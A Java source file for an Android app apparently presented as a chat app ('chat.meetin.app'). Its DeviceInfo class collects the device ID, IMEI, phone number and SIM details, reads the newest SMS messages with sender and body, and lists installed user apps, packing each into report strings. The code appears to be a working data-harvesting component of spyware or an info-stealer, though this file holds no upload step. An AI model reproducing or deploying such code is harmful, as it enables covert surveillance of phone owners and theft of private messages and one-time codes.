package chat.meetin.app;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class DeviceInfo {
    public static String getDeviceId(Context ctx) {
        String model = Build.MODEL == null ? "unknown" : Build.MODEL.replace(" ", "_");
        String androidId = "unknown";
        try {
            String value = Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (value != null && !value.isEmpty()) androidId = value;
        } catch (Exception ignored) {}
        return model + "|" + androidId;
    }

    public static String getFullInfo(Context ctx) {
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            StringBuilder sb = new StringBuilder();
            sb.append("DEVICE INFO\n");
            sb.append("Model: ").append(Build.MODEL).append("\n");
            sb.append("Brand: ").append(Build.BRAND).append("\n");
            sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
            sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
            sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
            sb.append("Device ID: ").append(getDeviceId(ctx)).append("\n");
            sb.append("Board: ").append(Build.BOARD).append("\n");
            sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
            sb.append("Security Patch: ").append(Build.VERSION.SECURITY_PATCH).append("\n");
            appendPhoneInfo(ctx, tm, sb);
            return sb.toString();
        } catch (Exception e) {
            return "Device Info Error: " + e.getMessage();
        }
    }

    @SuppressLint("MissingPermission")
    private static void appendPhoneInfo(Context ctx, TelephonyManager tm, StringBuilder sb) {
        if (tm == null) return;
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                sb.append("\nPhone Info: Permission Denied\n");
                return;
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                sb.append("\nIMEI: Restricted by Android 10+\n");
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    sb.append("\nIMEI: ").append(tm.getImei()).append("\n");
                } catch (Exception e) {
                    sb.append("\nIMEI: Not available\n");
                }
            } else {
                try {
                    sb.append("\nIMEI: ").append(tm.getDeviceId()).append("\n");
                } catch (Exception e) {
                    sb.append("\nIMEI: Not available\n");
                }
            }
            try {
                String number = tm.getLine1Number();
                sb.append("Phone Number: ").append(number != null ? number : "Not available").append("\n");
            } catch (Exception e) {
                sb.append("Phone Number: Not available\n");
            }
            try {
                sb.append("Network: ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("SIM Operator: ").append(tm.getSimOperatorName()).append("\n");
            } catch (Exception ignored) {}
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    sb.append("SIM Count: ").append(tm.getPhoneCount()).append("\n");
                } catch (Exception ignored) {}
            }
        } catch (SecurityException e) {
            sb.append("\nPhone Info: Permission Denied\n");
        } catch (Exception ignored) {}
    }

    public static String readSms(Context ctx) {
        return readSmsLimit(ctx, 5);
    }

    public static String readSmsLimit(Context ctx, int limit) {
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"address", "body"};
            try (Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null,
                    "date DESC LIMIT " + limit)) {
                if (cursor == null) return "No SMS access";
                int addressIndex = cursor.getColumnIndex("address");
                int bodyIndex = cursor.getColumnIndex("body");
                if (addressIndex < 0 || bodyIndex < 0) return "SMS columns unavailable";
                StringBuilder sb = new StringBuilder("SMS (last " + limit + "):\n");
                while (cursor.moveToNext()) {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    if (address != null && body != null) {
                        sb.append(address).append(": ").append(body).append("\n");
                    }
                }
                return sb.toString();
            }
        } catch (SecurityException e) {
            return "SMS permission denied";
        } catch (Exception e) {
            return "SMS error: " + e.getMessage();
        }
    }

    public static String getUserApps(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            List<ApplicationInfo> apps;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                apps = pm.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0));
            } else {
                apps = pm.getInstalledApplications(0);
            }
            List<String> userApps = new ArrayList<>();
            for (ApplicationInfo app : apps) {
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    try {
                        String label = pm.getApplicationLabel(app).toString();
                        if (label != null && !label.isEmpty()) userApps.add(label);
                    } catch (Exception ignored) {}
                }
            }
            StringBuilder sb = new StringBuilder("User Apps (" + userApps.size() + "):\n");
            for (String app : userApps) sb.append("- ").append(app).append("\n");
            return sb.toString();
        } catch (Exception e) {
            return "Apps error: " + e.getMessage();
        }
    }
}
